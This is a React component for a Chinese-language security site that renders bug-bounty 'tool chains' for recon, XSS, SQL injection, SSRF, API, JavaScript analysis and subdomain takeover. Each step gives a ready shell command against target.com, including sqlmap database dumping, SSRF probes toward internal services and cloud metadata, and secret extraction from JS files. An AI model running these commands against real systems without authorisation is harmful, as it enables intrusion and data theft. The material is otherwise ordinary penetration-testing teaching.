// app/tools/components/ToolChainsSection.tsx
import { ArrowRight, Search } from 'lucide-react';

// 完整工具链数据
const toolChainsData = [
  {
    id: "recon-full",
    title: "完整信息收集工具链",
    desc: "从子域名发现到接口、参数收集的全流程，覆盖被动+主动信息收集的完整工作流",
    steps: [
      {
        step: 1,
        title: "子域名枚举",
        tools: ["Subfinder", "Amass", "Assetfinder"],
        desc: "多工具并行枚举，收集最全的子域名列表",
        command: "subfinder -d target.com -all | sort -u > subs.txt && amass enum -passive -d target.com >> subs.txt && assetfinder --subs-only target.com >> subs.txt && sort -u subs.txt -o subs.txt"
      },
      {
        step: 2,
        title: "过滤存活主机",
        tools: ["httpx"],
        desc: "验证子域名是否存活，提取状态码、标题、技术栈信息",
        command: "cat subs.txt | httpx -silent -status-code -title -tech-detect -o live_hosts.txt"
      },
      {
        step: 3,
        title: "深度爬虫",
        tools: ["katana", "gospider"],
        desc: "爬取网站所有页面和链接，提取JS中的隐藏接口",
        command: "katana -list live_hosts.txt -jc -d 3 -o katana_urls.txt && gospider -S live_hosts.txt -o gospider_output --js"
      },
      {
        step: 4,
        title: "收集历史URL",
        tools: ["waybackurls", "gau"],
        desc: "从互联网存档中提取历史URL，发现被遗忘的旧接口",
        command: "cat live_hosts.txt | waybackurls >> historical_urls.txt && cat live_hosts.txt | gau --subs >> historical_urls.txt && sort -u historical_urls.txt -o historical_urls.txt"
      },
      {
        step: 5,
        title: "参数发现",
        tools: ["ParamSpider", "Arjun"],
        desc: "从URL中提取所有可测试的参数，为后续漏洞测试做准备",
        command: "paramspider -d target.com -o params.txt && cat urls.txt | arjun -o arjun_params.txt"
      },
      {
        step: 6,
        title: "初步漏洞扫描",
        tools: ["nuclei"],
        desc: "自动化扫描已知漏洞、配置错误、信息泄露",
        command: "nuclei -l live_hosts.txt -t exposures/ -t misconfiguration/ -t cves/ -o nuclei_results.txt"
      }
    ]
  },
  {
    id: "xss-hunting",
    title: "XSS漏洞挖掘工具链",
    desc: "从参数收集到XSS漏洞自动化检测的完整工作流，覆盖反射型、存储型XSS",
    steps: [
      {
        step: 1,
        title: "收集带参数的URL",
        tools: ["ParamSpider", "gau", "waybackurls"],
        desc: "收集所有包含参数的URL，作为XSS测试的目标",
        command: "paramspider -d target.com -o xss_params.txt && echo target.com | gau | grep \"=\" >> xss_params.txt && echo target.com | waybackurls | grep \"=\" >> xss_params.txt && sort -u xss_params.txt -o xss_params.txt"
      },
      {
        step: 2,
        title: "过滤反射型参数",
        tools: ["qsreplace", "httpx"],
        desc: "筛选出会在响应中反射用户输入的参数，缩小测试范围",
        command: "cat xss_params.txt | qsreplace \"XSS_TEST\" | httpx -silent -match-string \"XSS_TEST\" > reflected_params.txt"
      },
      {
        step: 3,
        title: "自动化XSS扫描",
        tools: ["Dalfox"],
        desc: "使用专业XSS扫描工具，自动化检测和验证XSS漏洞",
        command: "cat reflected_params.txt | dalfox pipe -b your-collaborator.com -o xss_results.txt"
      },
      {
        step: 4,
        title: "手动验证与深度利用",
        tools: ["Burp Suite"],
        desc: "对自动化扫描结果进行手动验证，确认漏洞可利用性，编写PoC",
        command: "Burp Suite Repeater手动修改payload，验证漏洞，绕过WAF"
      }
    ]
  },
  {
    id: "sqli-hunting",
    title: "SQL注入漏洞挖掘工具链",
    desc: "从参数收集到SQL注入漏洞检测的完整工作流，覆盖常规注入、盲注",
    steps: [
      {
        step: 1,
        title: "收集可能的注入点",
        tools: ["gau", "waybackurls", "ParamSpider"],
        desc: "收集所有与数据库交互的参数，尤其是id、query、search等参数",
        command: "echo target.com | gau | grep \"=\" | gf sqli > sqli_candidates.txt && paramspider -d target.com | grep \"=\" >> sqli_candidates.txt && sort -u sqli_candidates.txt -o sqli_candidates.txt"
      },
      {
        step: 2,
        title: "初步注入检测",
        tools: ["sqlmap", "Ghauri"],
        desc: "对候选参数进行自动化SQL注入检测，确认漏洞存在",
        command: "sqlmap -m sqli_candidates.txt --batch --random-agent --level 1 --risk 1 -o sqlmap_results.txt"
      },
      {
        step: 3,
        title: "深度利用",
        tools: ["sqlmap", "Burp Suite"],
        desc: "对确认的注入点进行深度利用，拖库、提权等",
        command: "sqlmap -u \"https://target.com/item?id=1\" --dbs --dump --batch"
      },
      {
        step: 4,
        title: "手动验证与绕过",
        tools: ["Burp Suite"],
        desc: "对自动化工具无法检测的盲注、WAF绕过场景进行手动测试",
        command: "Burp Suite Repeater手动测试注入payload，绕过WAF和过滤"
      }
    ]
  },
  {
    id: "ssrf-hunting",
    title: "SSRF漏洞挖掘工具链",
    desc: "针对SSRF漏洞的完整测试工作流，从参数发现到漏洞验证",
    steps: [
      {
        step: 1,
        title: "收集SSRF候选参数",
        tools: ["ParamSpider", "gau", "waybackurls"],
        desc: "收集所有接受URL、IP、域名的参数，比如url、link、redirect、host等",
        command: "echo target.com | gau | grep -iE \"url|link|redirect|host|domain|proxy\" > ssrf_candidates.txt && paramspider -d target.com | grep -iE \"url|link|redirect\" >> ssrf_candidates.txt"
      },
      {
        step: 2,
        title: "自动化SSRF检测",
        tools: ["SSRFmap", "qsreplace", "httpx", "Burp Collaborator"],
        desc: "使用自动化工具和DNS回调，检测SSRF漏洞，包括盲SSRF",
        command: "cat ssrf_candidates.txt | qsreplace \"http://your-collaborator.com\" | httpx -silent"
      },
      {
        step: 3,
        title: "深度利用",
        tools: ["Gopherus", "Burp Suite"],
        desc: "对确认的SSRF漏洞进行深度利用，访问内网服务、云元数据、端口扫描等",
        command: "Gopherus生成内网服务攻击payload，通过SSRF漏洞利用"
      },
      {
        step: 4,
        title: "绕过与权限提升",
        tools: ["Burp Suite"],
        desc: "测试各种SSRF绕过技术，包括localhost绕过、协议绕过、DNS重绑定等",
        command: "手动测试各种绕过payload，比如http://127.0.0.1、http://0.0.0.0、http://localhost等"
      }
    ]
  },
  {
    id: "api-testing",
    title: "API安全测试工具链",
    desc: "针对API接口的完整测试工作流，从接口发现到权限、注入漏洞测试",
    steps: [
      {
        step: 1,
        title: "API接口枚举",
        tools: ["katana", "Kiterunner", "LinkFinder", "gau"],
        desc: "发现所有API接口，包括REST API、GraphQL、内部接口",
        command: "katana -u https://api.target.com -jc -d 5 -o api_endpoints.txt && gau api.target.com >> api_endpoints.txt && kiterunner -w api-wordlist.txt -u https://api.target.com"
      },
      {
        step: 2,
        title: "接口与参数整理",
        tools: ["Postman", "Burp Suite"],
        desc: "整理所有接口的请求方法、参数、认证方式、响应结构",
        command: "Burp Suite记录所有API请求，导入Postman整理分类"
      },
      {
        step: 3,
        title: "权限越权测试",
        tools: ["Autorize", "Burp Repeater"],
        desc: "测试IDOR、垂直越权、水平越权等访问控制漏洞",
        command: "Burp Autorize插件自动化测试越权，多账号对比接口访问权限"
      },
      {
        step: 4,
        title: "认证与JWT测试",
        tools: ["jwt_tool", "Burp Suite"],
        desc: "测试JWT漏洞、认证绕过、会话管理缺陷",
        command: "jwt_tool.py -t <jwt_token> -M at 测试算法混淆等漏洞"
      },
      {
        step: 5,
        title: "注入与其他漏洞测试",
        tools: ["sqlmap", "Dalfox", "SSRFmap"],
        desc: "测试API参数中的注入漏洞、XSS、SSRF、数据泄露等",
        command: "针对每个接口的参数，测试各类注入漏洞"
      }
    ]
  },
  {
    id: "js-analysis",
    title: "JavaScript分析工具链",
    desc: "针对前端JS文件的完整分析工作流，发现隐藏接口、密钥、敏感信息、DOM XSS",
    steps: [
      {
        step: 1,
        title: "收集所有JS文件",
        tools: ["getJS", "katana", "gau"],
        desc: "收集目标网站的所有JavaScript文件，包括内联、外部、压缩的JS",
        command: "katana -u https://target.com -jc -d 3 | grep \"\\.js$\" | sort -u > js_files.txt && getJS -u https://target.com --complete >> js_files.txt"
      },
      {
        step: 2,
        title: "提取隐藏接口与路径",
        tools: ["LinkFinder", "grep"],
        desc: "从JS代码中提取隐藏的API接口、路径、路由",
        command: "for js in $(cat js_files.txt); do python3 linkfinder.py -i $js -o cli >> endpoints_from_js.txt; done"
      },
      {
        step: 3,
        title: "发现密钥与敏感信息",
        tools: ["SecretFinder", "grep", "truffleHog"],
        desc: "从JS中提取硬编码的API密钥、令牌、凭证、AWS密钥等敏感信息",
        command: "for js in $(cat js_files.txt); do python3 SecretFinder.py -i $js -o cli >> secrets.txt; done"
      },
      {
        step: 4,
        title: "DOM XSS漏洞检测",
        tools: ["Dalfox", "Burp Suite", "grep"],
        desc: "查找DOM XSS的source和sink，发现客户端XSS漏洞",
        command: "grep -iE \"innerHTML|document.write|eval|setTimeout|setInterval|location.href|window.open\" *.js"
      },
      {
        step: 5,
        title: "Source Map还原",
        tools: ["SourceMapper", "unwebpack-sourcemap"],
        desc: "还原webpack打包的代码，获取完整的未压缩源代码",
        command: "unwebpack-sourcemap https://target.com/_next/static/chunks/main-xxx.js.map -o source_code/"
      }
    ]
  },
  {
    id: "subdomain-takeover",
    title: "子域名接管漏洞检测工具链",
    desc: "从子域名枚举到子域名接管漏洞验证的完整工作流",
    steps: [
      {
        step: 1,
        title: "全量子域名枚举",
        tools: ["Subfinder", "Amass", "findomain", "crt.sh"],
        desc: "收集目标的所有子域名，包括历史解析记录、被动源发现的子域名",
        command: "subfinder -d target.com -all -o subs.txt && amass enum -passive -d target.com >> subs.txt && findomain -t target.com >> subs.txt && sort -u subs.txt -o subs.txt"
      },
      {
        step: 2,
        title: "解析子域名CNAME记录",
        tools: ["dig", "puredns", "subzy"],
        desc: "提取子域名的CNAME记录，识别指向第三方服务的子域名",
        command: "puredns resolve subs.txt --write-resolved resolved.txt"
      },
      {
        step: 3,
        title: "自动化接管漏洞扫描",
        tools: ["subzy", "nuclei", "tko-subs"],
        desc: "使用自动化工具扫描常见的第三方服务子域名接管漏洞",
        command: "subzy --targets subs.txt --hide_fails > takeover_results.txt && nuclei -l subs.txt -t takeover/ -o nuclei_takeover.txt"
      },
      {
        step: 4,
        title: "手动验证与确认",
        tools: ["dig", "curl", "浏览器"],
        desc: "对自动化扫描的结果进行手动验证，确认漏洞真实存在，避免误报",
        command: "dig CNAME vulnerable.target.com，访问子域名确认接管页面，验证可控制内容"
      }
    ]
  }
];

export default function ToolChainsSection() {
  return (
    <section>
      <div className="text-center mb-8">
        <h3 className="text-xl md:text-2xl font-bold mb-2">工具链实战指南 (Tool Chains)</h3>
        <p className="text-[#666] max-w-2xl mx-auto">
          如何把零散的工具串联成完整的自动化工作流，覆盖从信息收集到漏洞检测的全流程。
        </p>
      </div>

      <div className="space-y-8">
        {toolChainsData.map((chain) => (
          <div key={chain.id} className="bg-white rounded-lg border border-[#e5e5e5] p-6 hover:shadow-sm transition-all">
            {/* 工具链头部 */}
            <div className="flex flex-wrap items-start justify-between gap-3 mb-8">
              <div className="text-right md:text-left order-2 md:order-1">
                <p className="text-[#666]">{chain.desc}</p>
              </div>
              <div className="flex items-center gap-2 order-1 md:order-2">
                <h4 className="text-xl font-bold">{chain.title}</h4>
                <Search className="w-5 h-5 text-pink-400" />
              </div>
            </div>

            {/* 步骤列表 */}
            <div className="space-y-6">
              {chain.steps.map((step) => (
                <div key={step.step} className="relative">
                  {/* 步骤编号+工具标签（右上角） */}
                  <div className="absolute top-0 right-0 flex flex-wrap items-center gap-2">
                    <div className="flex flex-wrap gap-2">
                      {step.tools.map((tool) => (
                        <span key={tool} className="px-3 py-1 bg-[#f5f5f5] rounded-full text-xs font-medium">
                          {tool}
                        </span>
                      ))}
                    </div>
                    <span className="w-8 h-8 rounded-full bg-pink-100 text-pink-700 flex items-center justify-center font-bold">
                      {step.step}
                    </span>
                  </div>

                  {/* 步骤标题和说明 */}
                  <div className="mb-3 pt-1">
                    <div className="flex items-center gap-2 mb-1">
                      <ArrowRight className="w-4 h-4 text-[#666] flex-shrink-0" />
                      <h5 className="text-lg font-bold">{step.title}</h5>
                    </div>
                    <p className="text-sm text-[#666] ml-6">{step.desc}</p>
                  </div>

                  {/* 命令代码块 */}
                  <div className="ml-6 bg-[#f0f0f0] rounded-lg p-4 overflow-x-auto">
                    <code className="text-sm font-mono text-[#333] whitespace-pre-wrap break-all">
                      {step.command}
                    </code>
                  </div>
                </div>
              ))}
            </div>
          </div>
        ))}
      </div>
    </section>
  );
}